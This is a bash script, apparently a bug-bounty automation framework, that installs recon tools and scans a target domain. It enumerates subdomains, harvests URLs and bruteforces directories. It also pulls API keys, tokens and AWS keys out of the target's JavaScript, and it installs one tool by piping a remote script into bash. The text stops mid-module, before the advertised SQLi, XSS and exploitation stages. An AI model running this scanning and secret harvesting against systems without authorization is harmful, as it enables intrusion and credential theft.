#!/usr/bin/env bash
# ============================================================
#   BUG FRAMEWORK - Aggressive Bug Bounty Automation
#   Usage: bug -d example.com
# ============================================================

# ── Colors & Symbols ────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; MAGENTA='\033[0;35m'
WHITE='\033[1;37m'; BOLD='\033[1m'; DIM='\033[2m'; NC='\033[0m'
CHECK="${GREEN}✔${NC}"; CROSS="${RED}✖${NC}"; ARROW="${CYAN}▶${NC}"
WARN="${YELLOW}⚠${NC}"; FIRE="${RED}🔥${NC}"; BUG="${MAGENTA}🐛${NC}"

# ── Banner ───────────────────────────────────────────────────
print_banner() {
cat << 'EOF'
 ██████╗ ██╗   ██╗ ██████╗     ███████╗██████╗  █████╗ ███╗   ███╗███████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗
 ██╔══██╗██║   ██║██╔════╝     ██╔════╝██╔══██╗██╔══██╗████╗ ████║██╔════╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝
 ██████╔╝██║   ██║██║  ███╗    █████╗  ██████╔╝███████║██╔████╔██║█████╗  ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ 
 ██╔══██╗██║   ██║██║   ██║    ██╔══╝  ██╔══██╗██╔══██║██║╚██╔╝██║██╔══╝  ██║███╗██║██║   ██║██╔══██╗██╔═██╗ 
 ██████╔╝╚██████╔╝╚██████╔╝    ██║     ██║  ██║██║  ██║██║ ╚═╝ ██║███████╗╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗
 ╚═════╝  ╚═════╝  ╚═════╝     ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
EOF
    echo -e "${CYAN}                         [ Aggressive Bug Bounty Automation Framework ]${NC}"
    echo -e "${DIM}                         IDOR | AUTH | BAC | XSS | SQLi | LFI | CSRF | OWASP TOP 10${NC}"
    echo -e "${RED}                         ⚡ USE ONLY ON AUTHORIZED & IN-SCOPE TARGETS ⚡${NC}"
    echo -e "${DIM}─────────────────────────────────────────────────────────────────────────────────────────────────${NC}\n"
}

# ── Help ─────────────────────────────────────────────────────
show_help() {
    print_banner
    echo -e "${BOLD}USAGE:${NC}"
    echo -e "  ${CYAN}bug${NC} ${YELLOW}-d${NC} <domain>              Full aggressive recon + vuln scan"
    echo -e "  ${CYAN}bug${NC} ${YELLOW}-d${NC} <domain> ${YELLOW}--quick${NC}       Quick scan (skip slow modules)"
    echo -e "  ${CYAN}bug${NC} ${YELLOW}-d${NC} <domain> ${YELLOW}--no-exploit${NC}  Recon only, no auto-exploitation"
    echo -e "  ${RED}bug${NC} ${YELLOW}-d${NC} <domain> ${YELLOW}-we${NC}           URL + endpoint collection only (fast)"
    echo -e "  ${RED}bug${NC} ${YELLOW}-d${NC} <domain> ${YELLOW}-one${NC}          Single domain only (no subdomain enum)"
    echo -e "  ${RED}bug${NC} ${YELLOW}-d${NC} <domain> ${YELLOW}-sub${NC}          Subdomain enumeration only"
    echo -e "  ${RED}bug${NC} ${YELLOW}-d${NC} <domain> ${YELLOW}-js${NC}           JS analysis only (secrets + endpoints)"
    echo -e "  ${RED}bug${NC} ${YELLOW}-d${NC} <domain> ${YELLOW}-fuzz${NC}         Directory bruteforce + 403 bypass only"
    echo -e "  ${RED}bug${NC} ${YELLOW}-d${NC} <domain> ${YELLOW}-vuln${NC}         Vuln scan only (nuclei+dalfox+sqlmap)"
    echo -e "  ${RED}bug${NC} ${YELLOW}-d${NC} <domain> ${YELLOW}-report${NC}       Regenerate report from existing data"
    echo -e "  ${RED}bug${NC} ${YELLOW}-d${NC} <domain> ${YELLOW}-resume${NC}       Resume stopped scan from last module"
    echo -e "  ${RED}bug${NC} ${YELLOW}-d${NC} <domain> ${YELLOW}-deep${NC}         Ultra aggressive (max threads/wordlists)"
    echo -e "  ${RED}bug${NC} ${YELLOW}-scope${NC} <file>              Scan list of domains from file"
    echo -e "  ${CYAN}bug${NC} ${YELLOW}--install${NC}                Install/update all required tools"
    echo -e "  ${CYAN}bug${NC} ${YELLOW}--update-nuclei${NC}          Update nuclei templates only\n"
    echo -e "${BOLD}MODULES:${NC}"
    echo -e "  ${GREEN}01${NC} Subdomain Enumeration  (subfinder, amass, assetfinder, crt.sh, dnsx)"
    echo -e "  ${GREEN}02${NC} URL Collection         (waybackurls, gau, waymore, urlscan.io, katana)"
    echo -e "  ${GREEN}03${NC} JS Analysis            (subjs, getJS, LinkFinder, SecretFinder)"
    echo -e "  ${GREEN}04${NC} Path & Endpoint Discovery (ffuf, feroxbuster, dirsearch)"
    echo -e "  ${GREEN}05${NC} Live Host Probing      (httpx - full fingerprint)"
    echo -e "  ${GREEN}06${NC} Nuclei Vuln Scan       (all templates: cves, misconfig, exposures...)"
    echo -e "  ${GREEN}07${NC} XSS                   (dalfox, XSStrike)"
    echo -e "  ${GREEN}08${NC} SQLi                  (sqlmap level 5 risk 3)"
    echo -e "  ${GREEN}09${NC} SSRF                  (payload injection across all params)"
    echo -e "  ${GREEN}10${NC} LFI                   (LFISuite, payload fuzzing)"
    echo -e "  ${GREEN}11${NC} IDOR/Auth/BAC          (arjun param discovery + manual guide)"
    echo -e "  ${GREEN}12${NC} CSRF                  (detection + PoC generation)"
    echo -e "  ${GREEN}13${NC} Report Generation      (HTML + Markdown)"
    exit 0
}

# ── Argument Parsing ─────────────────────────────────────────
DOMAIN=""
QUICK=false
NO_EXPLOIT=false
INSTALL_ONLY=false
UPDATE_NUCLEI=false
WE_ONLY=false
ONE_ONLY=false
SUB_ONLY=false
JS_ONLY=false
FUZZ_ONLY=false
VULN_ONLY=false
REPORT_ONLY=false
RESUME_MODE=false
DEEP_MODE=false
SCOPE_FILE=""

while [[ "$#" -gt 0 ]]; do
    case $1 in
        -d) DOMAIN="$2"; shift ;;
        --quick) QUICK=true ;;
        --no-exploit) NO_EXPLOIT=true ;;
        --install) INSTALL_ONLY=true ;;
        --update-nuclei) UPDATE_NUCLEI=true ;;
        -we) WE_ONLY=true ;;
        -one) ONE_ONLY=true ;;
        -sub) SUB_ONLY=true ;;
        -js) JS_ONLY=true ;;
        -fuzz) FUZZ_ONLY=true ;;
        -vuln) VULN_ONLY=true ;;
        -report) REPORT_ONLY=true ;;
        -resume) RESUME_MODE=true ;;
        -deep) DEEP_MODE=true ;;
        -scope) SCOPE_FILE="$2"; shift ;;
        -h|--help) show_help ;;
        *) echo -e "${CROSS} Unknown parameter: $1"; exit 1 ;;
    esac
    shift
done

# ── Tool Definitions ──────────────────────────────────────────
declare -A TOOLS=(
    ["go"]="golang-go"
    ["python3"]="python3"
    ["pip3"]="python3-pip"
    ["curl"]="curl"
    ["wget"]="wget"
    ["git"]="git"
    ["jq"]="jq"
    ["nmap"]="nmap"
    ["nikto"]="nikto"
    ["whatweb"]="whatweb"
)

GO_TOOLS=(
    "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
    "github.com/projectdiscovery/httpx/cmd/httpx@latest"
    "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
    "github.com/projectdiscovery/katana/cmd/katana@latest"
    "github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
    "github.com/projectdiscovery/alterx/cmd/alterx@latest"
    "github.com/tomnomnom/waybackurls@latest"
    "github.com/tomnomnom/gf@latest"
    "github.com/tomnomnom/anew@latest"
    "github.com/tomnomnom/qsreplace@latest"
    "github.com/lc/gau/v2/cmd/gau@latest"
    "github.com/hahwul/dalfox/v2@latest"
    "github.com/hakluke/hakrawler@latest"
    "github.com/hakluke/hakcheckurl@latest"
    "github.com/ffuf/ffuf/v2@latest"
    "github.com/003random/getJS@latest"
    "github.com/bp0lr/gauplus@latest"
    "github.com/owasp-amass/amass/v4/...@master"
    "github.com/tomnomnom/assetfinder@latest"
)

PIP_TOOLS=(
    "waymore"
    "uro"
    "arjun"
    "dirsearch"
)

# ── Logging Setup ─────────────────────────────────────────────
START_TIME=$(date +%s)
LOG_MASTER=""

log() {
    local level="$1"; shift
    local msg="$*"
    local ts
    ts=$(date '+%H:%M:%S')
    case "$level" in
        INFO)  echo -e "${ARROW} ${WHITE}[$ts]${NC} $msg" | tee -a "$LOG_MASTER" ;;
        OK)    echo -e "${CHECK} ${GREEN}[$ts]${NC} $msg" | tee -a "$LOG_MASTER" ;;
        WARN)  echo -e "${WARN} ${YELLOW}[$ts]${NC} $msg" | tee -a "$LOG_MASTER" ;;
        ERROR) echo -e "${CROSS} ${RED}[$ts]${NC} $msg" | tee -a "$LOG_MASTER" ;;
        STEP)  echo -e "\n${BOLD}${MAGENTA}══════════════════════════════════════════${NC}" | tee -a "$LOG_MASTER"
               echo -e "${FIRE} ${BOLD}${WHITE} $msg ${NC}" | tee -a "$LOG_MASTER"
               echo -e "${BOLD}${MAGENTA}══════════════════════════════════════════${NC}\n" | tee -a "$LOG_MASTER" ;;
        DONE)  echo -e "${BUG} ${BOLD}${CYAN}[$ts] $msg${NC}" | tee -a "$LOG_MASTER" ;;
    esac
}

section_header() {
    echo -e "\n${BOLD}${BLUE}┌──────────────────────────────────────────────────┐${NC}" | tee -a "$LOG_MASTER"
    echo -e "${BOLD}${BLUE}│  ${YELLOW}⚡ $1${BLUE}$(printf '%*s' $((48 - ${#1})) '')│${NC}" | tee -a "$LOG_MASTER"
    echo -e "${BOLD}${BLUE}└──────────────────────────────────────────────────┘${NC}\n" | tee -a "$LOG_MASTER"
}

# ── Tool Check & Install ──────────────────────────────────────
check_tool() {
    command -v "$1" &>/dev/null
}

install_tools() {
    log STEP "CHECKING & INSTALLING REQUIRED TOOLS"
    
    # Update apt
    log INFO "Updating package lists..."
    sudo apt-get update -qq 2>/dev/null

    # System packages
    for tool in "${!TOOLS[@]}"; do
        if check_tool "$tool"; then
            log OK "$tool already installed"
        else
            log INFO "Installing $tool (${TOOLS[$tool]})..."
            sudo apt-get install -y -qq "${TOOLS[$tool]}" 2>/dev/null && log OK "$tool installed" || log WARN "Could not install $tool via apt"
        fi
    done

    # Go setup
    if ! check_tool go; then
        log INFO "Installing Go..."
        wget -q "https://go.dev/dl/go1.22.0.linux-amd64.tar.gz" -O /tmp/go.tar.gz
        sudo tar -C /usr/local -xzf /tmp/go.tar.gz
        echo 'export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin' >> ~/.bashrc
        export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin
    fi
    export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin
    export GOPATH=$HOME/go

    # Go tools
    log INFO "Installing Go-based tools..."
    for pkg in "${GO_TOOLS[@]}"; do
        tool_name=$(basename "${pkg%@*}")
        if check_tool "$tool_name"; then
            log OK "$tool_name already installed"
        else
            log INFO "Installing $tool_name..."
            go install "$pkg" 2>/dev/null && log OK "$tool_name installed" || log WARN "Failed: $tool_name"
        fi
    done

    # Python tools
    log INFO "Installing Python tools..."
    for pkg in "${PIP_TOOLS[@]}"; do
        if pip3 show "$pkg" &>/dev/null || check_tool "$pkg"; then
            log OK "$pkg already installed"
        else
            log INFO "Installing $pkg..."
            pip3 install -q "$pkg" 2>/dev/null && log OK "$pkg installed" || log WARN "Failed: $pkg"
        fi
    done

    # sqlmap
    if ! check_tool sqlmap; then
        log INFO "Installing sqlmap..."
        sudo apt-get install -y -qq sqlmap 2>/dev/null || pip3 install -q sqlmap 2>/dev/null
    else
        log OK "sqlmap already installed"
    fi

    # feroxbuster
    if ! check_tool feroxbuster; then
        log INFO "Installing feroxbuster..."
        curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | bash -s /usr/local/bin 2>/dev/null
    else
        log OK "feroxbuster already installed"
    fi

    # SecretFinder
    if [[ ! -f "$HOME/tools/SecretFinder/SecretFinder.py" ]]; then
        log INFO "Installing SecretFinder..."
        mkdir -p "$HOME/tools"
        git clone -q https://github.com/m4ll0k/SecretFinder.git "$HOME/tools/SecretFinder" 2>/dev/null
        pip3 install -qr "$HOME/tools/SecretFinder/requirements.txt" 2>/dev/null
    else
        log OK "SecretFinder already installed"
    fi

    # LinkFinder
    if [[ ! -f "$HOME/tools/LinkFinder/linkfinder.py" ]]; then
        log INFO "Installing LinkFinder..."
        git clone -q https://github.com/GerbenJavado/LinkFinder.git "$HOME/tools/LinkFinder" 2>/dev/null
        pip3 install -qr "$HOME/tools/LinkFinder/requirements.txt" 2>/dev/null
    else
        log OK "LinkFinder already installed"
    fi

    # GF patterns
    if [[ ! -d "$HOME/.gf" ]]; then
        log INFO "Installing GF patterns..."
        mkdir -p ~/.gf
        git clone -q https://github.com/1ndianl33t/Gf-Patterns.git /tmp/gf-patterns 2>/dev/null
        cp /tmp/gf-patterns/*.json ~/.gf/ 2>/dev/null
        git clone -q https://github.com/tomnomnom/gf.git /tmp/gf-src 2>/dev/null
        cp /tmp/gf-src/examples/*.json ~/.gf/ 2>/dev/null
    else
        log OK "GF patterns already set up"
    fi

    # Nuclei templates
    if [[ ! -d "$HOME/nuclei-templates" ]]; then
        log INFO "Downloading nuclei templates..."
        nuclei -update-templates -silent 2>/dev/null
    else
        log OK "Nuclei templates already present"
    fi

    # Wordlists
    if [[ ! -f "/usr/share/wordlists/dirb/common.txt" ]]; then
        sudo apt-get install -y -qq dirb 2>/dev/null
    fi
    if [[ ! -f "/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt" ]]; then
        log INFO "Installing SecLists..."
        sudo apt-get install -y -qq seclists 2>/dev/null || \
        git clone -q --depth 1 https://github.com/danielmiessler/SecLists.git /usr/share/seclists 2>/dev/null
    fi

    log DONE "Tool installation complete!"
}

# ── Directory Setup ───────────────────────────────────────────
setup_workspace() {
    WORKSPACE="$HOME/bug-bounty/$DOMAIN"
    mkdir -p "$WORKSPACE"/{subdomains,urls,js,paths,endpoints,params,vulns/{xss,sqli,ssrf,lfi,csrf,idor,nuclei,misconfig},screenshots,reports,logs}
    
    LOG_MASTER="$WORKSPACE/logs/master.log"
    touch "$LOG_MASTER"
    
    echo -e "${BOLD}${GREEN}"
    echo "  Workspace: $WORKSPACE"
    echo "  Target:    $DOMAIN"
    echo "  Started:   $(date)"
    echo -e "${NC}"
    
    # Save run config
    cat > "$WORKSPACE/scan_config.txt" << EOF
TARGET=$DOMAIN
DATE=$(date)
WORKSPACE=$WORKSPACE
MODE=$([ "$QUICK" = true ] && echo "QUICK" || echo "FULL_AGGRESSIVE")
EXPLOIT=$([ "$NO_EXPLOIT" = true ] && echo "DISABLED" || echo "ENABLED")
EOF
}

# ── Progress Bar ──────────────────────────────────────────────
TOTAL_STEPS=13
CURRENT_STEP=0
show_progress() {
    CURRENT_STEP=$((CURRENT_STEP + 1))
    local pct=$((CURRENT_STEP * 100 / TOTAL_STEPS))
    local filled=$((pct / 5))
    local bar=""
    for ((i=0; i<filled; i++)); do bar+="█"; done
    for ((i=filled; i<20; i++)); do bar+="░"; done
    echo -e "\n${CYAN}Progress: [${bar}] ${pct}% (${CURRENT_STEP}/${TOTAL_STEPS}) - $1${NC}\n"
}

# ══════════════════════════════════════════════════════════════
# MODULE 01 - SUBDOMAIN ENUMERATION
# ══════════════════════════════════════════════════════════════
module_subdomains() {
    if [[ "$ONE_ONLY" == true ]]; then
        show_progress "Subdomain Enumeration (SKIPPED — -one mode)"
        log INFO "-one mode: skipping subdomain enum, using $DOMAIN only"
        return 0
    fi
    show_progress "Subdomain Enumeration"
    section_header "MODULE 01 — SUBDOMAIN ENUMERATION"
    local out="$WORKSPACE/subdomains"

    # subfinder
    log INFO "Running subfinder (passive)..."
    subfinder -d "$DOMAIN" -silent -all -recursive -o "$out/subfinder.txt" 2>/dev/null
    log OK "subfinder: $(wc -l < "$out/subfinder.txt" 2>/dev/null || echo 0) subdomains"

    # crt.sh
    log INFO "Querying crt.sh..."
    curl -s "https://crt.sh/?q=%25.$DOMAIN&output=json" 2>/dev/null | \
        jq -r '.[].name_value' 2>/dev/null | \
        sed 's/\*\.//g' | sort -u > "$out/crtsh.txt"
    log OK "crt.sh: $(wc -l < "$out/crtsh.txt" 2>/dev/null || echo 0) subdomains"

    # assetfinder
    log INFO "Running assetfinder..."
    assetfinder --subs-only "$DOMAIN" 2>/dev/null | sort -u > "$out/assetfinder.txt"
    log OK "assetfinder: $(wc -l < "$out/assetfinder.txt" 2>/dev/null || echo 0) subdomains"

    # amass passive (skip in quick mode)
    if [[ "$QUICK" == false ]]; then
        log INFO "Running amass (passive, may take time)..."
        amass enum -passive -d "$DOMAIN" -o "$out/amass.txt" -silent 2>/dev/null &
        AMASS_PID=$!
        sleep 120
        kill $AMASS_PID 2>/dev/null
        log OK "amass: $(wc -l < "$out/amass.txt" 2>/dev/null || echo 0) subdomains"
    fi

    # urlscan.io
    log INFO "Querying urlscan.io for subdomains..."
    curl -s "https://urlscan.io/api/v1/search/?q=domain:$DOMAIN&size=10000" 2>/dev/null | \
        jq -r '.results[]?.page?.domain' 2>/dev/null | \
        grep -F ".$DOMAIN" | sort -u > "$out/urlscan_domains.txt"
    log OK "urlscan.io: $(wc -l < "$out/urlscan_domains.txt" 2>/dev/null || echo 0) subdomains"

    # hackertarget
    log INFO "Querying HackerTarget..."
    curl -s "https://api.hackertarget.com/hostsearch/?q=$DOMAIN" 2>/dev/null | \
        cut -d',' -f1 | sort -u > "$out/hackertarget.txt"

    # ThreatCrowd
    log INFO "Querying ThreatCrowd..."
    curl -s "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=$DOMAIN" 2>/dev/null | \
        jq -r '.subdomains[]?' 2>/dev/null | sort -u > "$out/threatcrowd.txt"

    # Merge all
    cat "$out"/*.txt 2>/dev/null | sort -u | grep -E "^[a-zA-Z0-9.-]+\.$DOMAIN$" > "$out/all_subdomains.txt"
    log OK "Total unique subdomains: $(wc -l < "$out/all_subdomains.txt")"

    # DNS resolution with dnsx
    log INFO "Resolving subdomains with dnsx..."
    cat "$out/all_subdomains.txt" | dnsx -silent -a -resp -o "$out/resolved.txt" 2>/dev/null
    cat "$out/resolved.txt" | awk '{print $1}' > "$out/resolved_domains.txt"
    log OK "Resolved: $(wc -l < "$out/resolved_domains.txt" 2>/dev/null || echo 0) live subdomains"

    # Wildcard check
    log INFO "Checking for wildcard DNS..."
    WILDCARD=$(dig "nonexistent999.$DOMAIN" A +short 2>/dev/null)
    if [[ -n "$WILDCARD" ]]; then
        log WARN "Wildcard DNS detected: $WILDCARD — results may have false positives"
        echo "WILDCARD=$WILDCARD" >> "$WORKSPACE/scan_config.txt"
    fi
}

# ══════════════════════════════════════════════════════════════
# MODULE 02 - LIVE HOST PROBING
# ══════════════════════════════════════════════════════════════
module_httpx() {
    show_progress "Live Host Probing (httpx)"
    section_header "MODULE 02 — LIVE HOST PROBING"
    if [[ "$ONE_ONLY" == true ]]; then
        log INFO "-one mode: probing single domain only"
        echo "https://$DOMAIN" | httpx -silent -status-code -title -tech-detect -content-length -web-server -ip -json -o "$WORKSPACE/subdomains/live_hosts.json" 2>/dev/null
        echo "https://$DOMAIN" > "$WORKSPACE/subdomains/live_urls.txt"
        echo "https://$DOMAIN" > "$WORKSPACE/subdomains/status_200.txt"
        log OK "Single target: https://$DOMAIN"
        return 0
    fi
    local out="$WORKSPACE/subdomains"

    log INFO "Running httpx full fingerprint..."
    cat "$out/resolved_domains.txt" "$out/all_subdomains.txt" 2>/dev/null | sort -u | \
        httpx -silent \
              -status-code \
              -title \
              -tech-detect \
              -content-length \
              -web-server \
              -ip \
              -cname \
              -cdn \
              -ports 80,443,8080,8443,8888,8000,3000,4000,5000,9000 \
              -threads 50 \
              -timeout 10 \
              -o "$out/live_hosts_full.txt" \
              -json -o "$out/live_hosts.json" 2>/dev/null

    # Extract URLs only
    cat "$out/live_hosts.json" 2>/dev/null | jq -r '.url' 2>/dev/null | sort -u > "$out/live_urls.txt"
    log OK "Live hosts: $(wc -l < "$out/live_urls.txt" 2>/dev/null || echo 0)"

    # Extract by status code
    for code in 200 301 302 401 403 404 500; do
        grep -w "\"status_code\":$code" "$out/live_hosts.json" 2>/dev/null | jq -r '.url' 2>/dev/null > "$out/status_${code}.txt"
    done
    log OK "Status 200: $(wc -l < "$out/status_200.txt" 2>/dev/null || echo 0) | 403: $(wc -l < "$out/status_403.txt" 2>/dev/null || echo 0) | 401: $(wc -l < "$out/status_401.txt" 2>/dev/null || echo 0)"

    # Save 403s for bypass attempts later
    cat "$out/status_403.txt" > "$WORKSPACE/paths/403_targets.txt" 2>/dev/null
}

# ══════════════════════════════════════════════════════════════
# MODULE 03 - URL COLLECTION (ALL SOURCES)
# ══════════════════════════════════════════════════════════════
module_urls() {
    show_progress "URL Collection"
    section_header "MODULE 03 — URL COLLECTION (ALL SOURCES)"
    local out="$WORKSPACE/urls"

    # waybackurls — main domain only + top 30 subs with per-host timeout
    log INFO "Collecting from Wayback Machine (2 min max per host)..."
    timeout 120 bash -c "echo '$DOMAIN' | waybackurls 2>/dev/null" | sort -u > "$out/wayback.txt"
    log INFO "Wayback: main domain done ($(wc -l < "$out/wayback.txt") URLs). Running subs (30s each)..."
    head -30 "$WORKSPACE/subdomains/resolved_domains.txt" 2>/dev/null | \
        while read -r sub; do
            timeout 30 bash -c "echo '$sub' | waybackurls 2>/dev/null" 2>/dev/null
        done | sort -u >> "$out/wayback.txt"
    sort -u -o "$out/wayback.txt" "$out/wayback.txt"
    log OK "Wayback: $(wc -l < "$out/wayback.txt") URLs"

    # gau — with timeout and blacklist noisy extensions
    log INFO "Collecting from gau (AlienVault, URLScan, Wayback)..."
    timeout 180 gau --subs --threads 10 --timeout 10 \
        --blacklist png,jpg,gif,ico,svg,woff,woff2,ttf,eot,css,mp4,mp3,zip,pdf \
        "$DOMAIN" 2>/dev/null | sort -u > "$out/gau.txt"
    log OK "gau: $(wc -l < "$out/gau.txt" 2>/dev/null || echo 0) URLs"

    # waymore — with global timeout
    log INFO "Running waymore (aggressive multi-source, 3 min max)..."
    timeout 180 waymore -i "$DOMAIN" -mode U -oU "$out/waymore.txt" --timeout 30 2>/dev/null || \
        timeout 180 python3 -m waymore -i "$DOMAIN" -mode U -oU "$out/waymore.txt" 2>/dev/null || \
        log WARN "waymore skipped/timed out"
    log OK "waymore: $(wc -l < "$out/waymore.txt" 2>/dev/null || echo 0) URLs"

    # urlscan.io
    log INFO "Fetching from urlscan.io..."
    curl -s "https://urlscan.io/api/v1/search/?q=domain:$DOMAIN&size=10000" 2>/dev/null | \
        jq -r '.results[]?.page?.url' 2>/dev/null | sort -u > "$out/urlscan.txt"
    log OK "urlscan.io: $(wc -l < "$out/urlscan.txt" 2>/dev/null || echo 0) URLs"

    # katana crawl live targets (10 min max)
    log INFO "Running katana crawler on live targets (10 min max)..."
    timeout 600 katana -list "$WORKSPACE/subdomains/live_urls.txt" \
           -jc -jsl -kf all \
           -depth 3 \
           -aff \
           -silent \
           -timeout 10 \
           -c 50 -p 20 \
           -o "$out/katana.txt" 2>/dev/null || log WARN "katana timed out"
    log OK "katana: $(wc -l < "$out/katana.txt" 2>/dev/null || echo 0) URLs"

    # hakrawler (5 min max)
    log INFO "Running hakrawler (5 min max)..."
    timeout 300 bash -c "cat '$WORKSPACE/subdomains/live_urls.txt' | \
        hakrawler -depth 2 -subs -u 2>/dev/null | sort -u > '$out/hakrawler.txt'" || \
        log WARN "hakrawler timed out"
    log OK "hakrawler: $(wc -l < "$out/hakrawler.txt" 2>/dev/null || echo 0) URLs"

    # Merge and deduplicate
    cat "$out"/*.txt 2>/dev/null | sort -u > "$out/all_urls_raw.txt"
    log OK "Raw total: $(wc -l < "$out/all_urls_raw.txt") URLs"

    # Filter with uro (remove duplicates/similar)
    cat "$out/all_urls_raw.txt" | uro 2>/dev/null > "$out/all_urls.txt" || \
        cp "$out/all_urls_raw.txt" "$out/all_urls.txt"
    log OK "Deduplicated: $(wc -l < "$out/all_urls.txt") URLs"

    # GF pattern extraction
    log INFO "Extracting interesting URLs with gf patterns..."
    local gf_out="$out/gf"
    mkdir -p "$gf_out"
    for pattern in xss sqli ssrf redirect lfi rce idor interestingparams interestingEXT; do
        gf "$pattern" "$out/all_urls.txt" 2>/dev/null | sort -u > "$gf_out/${pattern}.txt"
        local count; count=$(wc -l < "$gf_out/${pattern}.txt" 2>/dev/null || echo 0)
        [[ $count -gt 0 ]] && log OK "gf $pattern: $count URLs"
    done

    # Extract parameters
    log INFO "Extracting all parameters..."
    cat "$out/all_urls.txt" | \
        grep -oP '[?&][a-zA-Z0-9_\-]+=' | \
        sed 's/[?&]//;s/=//' | \
        sort -u > "$WORKSPACE/params/all_params.txt"
    log OK "Unique parameters: $(wc -l < "$WORKSPACE/params/all_params.txt")"

    # URLs with parameters only
    grep -E "\?[a-zA-Z0-9_]+=." "$out/all_urls.txt" | sort -u > "$out/urls_with_params.txt"
    log OK "URLs with params: $(wc -l < "$out/urls_with_params.txt")"
}

# ══════════════════════════════════════════════════════════════
# MODULE 04 - JS ANALYSIS
# ══════════════════════════════════════════════════════════════
module_js() {
    show_progress "JS Analysis"
    section_header "MODULE 04 — JAVASCRIPT ANALYSIS"
    local out="$WORKSPACE/js"

    # Collect JS files
    log INFO "Collecting JavaScript files..."
    cat "$WORKSPACE/urls/all_urls.txt" 2>/dev/null | grep -E "\.js(\?|$)" | sort -u > "$out/js_urls.txt"

    # getJS from live hosts
    cat "$WORKSPACE/subdomains/live_urls.txt" 2>/dev/null | while read -r url; do
        getJS --url "$url" --complete 2>/dev/null
    done | sort -u >> "$out/js_urls.txt"
    sort -u -o "$out/js_urls.txt" "$out/js_urls.txt"
    log OK "JS files found: $(wc -l < "$out/js_urls.txt")"

    # Download JS files
    log INFO "Downloading JS files for analysis..."
    mkdir -p "$out/downloaded"
    while IFS= read -r jsurl; do
        safe_name=$(echo "$jsurl" | md5sum | cut -d' ' -f1)
        curl -s -L --max-time 15 "$jsurl" -o "$out/downloaded/${safe_name}.js" 2>/dev/null
    done < "$out/js_urls.txt"

    # LinkFinder on all JS
    log INFO "Running LinkFinder on all JS files..."
    while IFS= read -r jsurl; do
        python3 "$HOME/tools/LinkFinder/linkfinder.py" -i "$jsurl" -o cli 2>/dev/null
    done < "$out/js_urls.txt" | sort -u > "$out/linkfinder_endpoints.txt"
    log OK "LinkFinder endpoints: $(wc -l < "$out/linkfinder_endpoints.txt")"

    # SecretFinder
    log INFO "Running SecretFinder (looking for secrets/keys)..."
    while IFS= read -r jsurl; do
        python3 "$HOME/tools/SecretFinder/SecretFinder.py" -i "$jsurl" -o cli 2>/dev/null
    done < "$out/js_urls.txt" > "$out/secrets_found.txt" 2>/dev/null
    if [[ -s "$out/secrets_found.txt" ]]; then
        log WARN "⚠ SECRETS FOUND — check $out/secrets_found.txt"
    fi

    # Regex extraction from downloaded JS
    log INFO "Extracting endpoints, tokens, and keys from JS content..."
    cat "$out/downloaded/"*.js 2>/dev/null | grep -oE '(https?://|/)[a-zA-Z0-9._/?=&%-]+' | \
        grep -v "\.png\|\.jpg\|\.gif\|\.css\|\.woff\|\.svg" | \
        sort -u > "$out/js_endpoints_raw.txt"

    # Extract API keys / tokens
    cat "$out/downloaded/"*.js 2>/dev/null | \
        grep -oE '(api_key|apikey|api-key|token|secret|password|passwd|pwd|auth|bearer|sk-[a-zA-Z0-9]+|AKIA[0-9A-Z]{16}|[a-zA-Z0-9/+]{40})["\s]*[:=]["\s]*["\x27][a-zA-Z0-9._\-/+]{8,}["\x27]' \
        > "$out/potential_secrets.txt" 2>/dev/null

    # AWS keys
    cat "$out/downloaded/"*.js 2>/dev/null | grep -oE 'AKIA[A-Z0-9]{16}' | sort -u > "$out/aws_keys.txt"
    [[ -s "$out/aws_keys.txt" ]] && log WARN "AWS KEY CANDIDATES FOUND!"

    # Merge all JS endpoints
    cat "$out/linkfinder_endpoints.txt" "$out/js_endpoints_raw.txt" 2>/dev/null | sort -u > "$out/all_js_endpoints.txt"
    log OK "Total JS endpoints: $(wc -l < "$out/all_js_endpoints.txt")"

    # Add JS endpoints to main endpoint list
    cat "$out/all_js_endpoints.txt" >> "$WORKSPACE/endpoints/all_endpoints.txt" 2>/dev/null
    sort -u -o "$WORKSPACE/endpoints/all_endpoints.txt" "$WORKSPACE/endpoints/all_endpoints.txt" 2>/dev/null
}

# ══════════════════════════════════════════════════════════════
# MODULE 05 - PATH & ENDPOINT DISCOVERY
# ══════════════════════════════════════════════════════════════
module_paths() {
    show_progress "Path & Endpoint Discovery"
    section_header "MODULE 05 — PATH & ENDPOINT DISCOVERY"
    local out="$WORKSPACE/paths"
    local ep="$WORKSPACE/endpoints"
    mkdir -p "$ep"

    # Wordlists
    local WL_COMMON="/usr/share/wordlists/dirb/common.txt"
    local WL_RAFT="/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt"
    local WL_API="/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt"
    local WL_MEDIUM="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
    [[ ! -f "$WL_RAFT" ]] && WL_RAFT="$WL_COMMON"
    [[ ! -f "$WL_API" ]] && WL_API="$WL_COMMON"

    # Run ffuf on top live targets (200/403)
    log INFO "Running ffuf directory bruteforce on live targets..."
    head -20 "$WORKSPACE/subdomains/live_urls.txt" 2>/dev/null | while read -r target; do
        safe=$(echo "$target" | sed 's|https\?://||;s|/||g')
        ffuf -u "${target}/FUZZ" \
             -w "$WL_RAFT" \
             -t 100 \
             -mc 200,201,204,301,302,307,401,403,405,500 \
             -of json \
             -o "$out/ffuf_${safe}.json" \
             -s 2>/dev/null
    done
    log OK "ffuf complete"

    # Run feroxbuster (recursive) on main domain
    log INFO "Running feroxbuster (recursive) on main domain..."
